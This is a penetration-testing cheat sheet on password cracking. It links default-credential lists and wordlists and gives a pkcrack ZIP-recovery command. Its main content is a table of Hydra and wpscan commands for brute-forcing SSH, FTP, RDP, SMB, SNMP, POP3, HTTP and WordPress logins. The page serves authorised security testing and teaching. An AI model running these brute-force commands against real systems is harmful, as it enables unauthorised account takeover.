# Password Cracking

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
{% endhint %}

## Headings:

This page was getting to be long, so here are shortcuts to the major sections.  I broke these out into separate pages for better organization and searchability.

* [Getting the hashes](gathering-the-hashes.md)
* [Wordlist manipulation](wordlist-manipulation.md)
* [Cracking the Hashes](cracking-the-hashes.md)

Not all methods of discovering passwords involve directly "cracking" hashes.  Brute forcing logins and direct recovery programs are also viable solutions.

## Default Credentials

Search using your favorite web search engine for default credentials of the technology that is being used, or try the following compilation lists:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)

## Wordlists

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/carlospolop/hacktricks/tree/95b16dc7eb952272459fc877e4c9d0777d746a16/google/fuzzing/tree/master/dictionaries/README.md)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

## Password Recovery

Password recovery programs: [https://www.passcape.com/products](https://www.passcape.com/products) (TODO:Test these!)

### ZIP Password Retrieval (with Known Plaintext)

_Download pkcrack_

[https://www.unix-ag.uni-kl.de/\~conrad/krypto/pkcrack/download1.html](https://www.unix-ag.uni-kl.de/\~conrad/krypto/pkcrack/download1.html)

! Before using, it must be built from source

_Syntax_

```bash
./pkcrack -C $encrypted.zip -c file -P $plaintext.zip -p file
```

## Brute forcing logins <a href="#hydra" id="hydra"></a>

An amazing index of brute-force commands: [https://book.hacktricks.xyz/brute-force](https://book.hacktricks.xyz/brute-force)

### Hydra

Below are a few scriptable examples to brute force logins of common protocols.

| Command                                                                                                                              | Description                                                |
| ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
| `hydra -P $pass_list -v $ip snmp -vV`                                                                                                | SNMP: Brute force                                          |
| `hydra -t 1 -l $user -P $pass_list -vV $ip ftp`                                                                                      | FTP: with known user, using password list                  |
| `hydra -vV -u -L $users_list -P $pass_list -t 1 -u $ip ssh`                                                                          | SSH: using users list, and passwords list                  |
| `hydra -vV -u -L $users_list -p $pass -t 1 -u $ip ssh`                                                                               | SSH: with a known password, and a username list            |
| `hydra -vV $ip -s $port ssh -l $user -P $pass_list`                                                                                  | SSH: with known username on non-standard port              |
| `hydra -vV -l $user -P $pass_list -f $ip pop3`                                                                                       | POP3: Brute Force                                          |
| `hydra -vV -L $users_list -P $pass_list $ip http-get $login_page`                                                                    | HTTP GET: with user list and pass list                     |
| `hydra -vV -t 1 -f -l $user -P $pass_list rdp://$ip`                                                                                 | Windows Remote Desktop: with known username, and pass list |
| `hydra -vV -t 1 -f -l $user -P $pass_list $ip smb`                                                                                   | SMB: brute force with known user, and pass list            |
| `hydra -vV -l $user -P $pass_list $ip http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress: brute force an admin login                      |
| `hydra -vV -L $users_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'`     | WordPress: enumerate users                                 |
| `wpscan --url $url -U $user -P $pass_list`                                                                                           | Use wpscan to brute force password with known user         |

#### Other useful Hydra options

**`-x min:max:charset` -** Generate passwords from min to max length. Charset can contain `1` for numbers, `a` for lowercase and `A` for uppercase characters.  Any other character that is added is put in the list. \
Example: `1:2:a1%.` The generated passwords will be of length 1 to 2 and contain lowercase letters, numbers and/or percent signs and periods/dots.

**`-e nsr` -** Do additional checks. `n` for null password, `s` try login as pass, `r` try the reverse login as pass

### crackmapexec

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}

[https://mpgn.gitbook.io/crackmapexec/](https://mpgn.gitbook.io/crackmapexec/)

## Resources

* [https://www.unix-ninja.com/p/A\_cheat-sheet\_for\_password\_crackers](https://www.unix-ninja.com/p/A\_cheat-sheet\_for\_password\_crackers)
* [https://github.com/frizb/](https://github.com/frizb/)
* [https://guide.offsecnewbie.com/password-cracking](https://guide.offsecnewbie.com/password-cracking)
* [https://www.hackingarticles.in/abusing-kerberos-using-impacket/](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)



If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
